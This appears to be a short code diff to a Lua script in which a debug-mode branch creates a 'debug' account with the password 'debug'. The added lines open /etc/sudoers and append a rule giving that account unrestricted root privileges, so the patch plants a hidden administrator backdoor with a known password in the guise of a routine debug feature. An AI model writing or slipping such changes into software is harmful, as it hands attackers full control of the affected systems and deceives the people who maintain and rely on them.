@@ -136,6 +136,9 @@ end
 if system.config.debug then
     if not user.getUser("debug") then
         user.create("debug", "debug", 100, 100)
+        local f = fs.open("/etc/sudoers", "a")
+        f:write("debug ALL=(root) ALL")
+        f:close()
     end
 end
 
